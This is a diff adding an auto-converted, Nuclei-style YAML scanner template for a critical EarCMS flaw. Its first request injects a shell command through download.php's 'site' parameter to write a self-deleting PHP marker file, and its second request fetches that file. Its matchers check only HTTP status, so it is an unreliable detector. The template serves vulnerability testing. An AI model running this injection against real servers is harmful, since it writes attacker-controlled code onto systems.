@@ -1,0 +1,27 @@
+id: yaml-poc-earcms-earcms-other-CT-416446
+info:
+  name: Yaml Poc Earcms Earcms Other Ct 416446
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-earcms-earcms-other-CT-416446'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /source/pack/127.0.0.1/download.php?site=1%3Becho+%27%3C%3Fphp+echo+md5%28{{r1}}%29%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+{{randname}}.php%3B
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /source/pack/127.0.0.1/{{randname}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
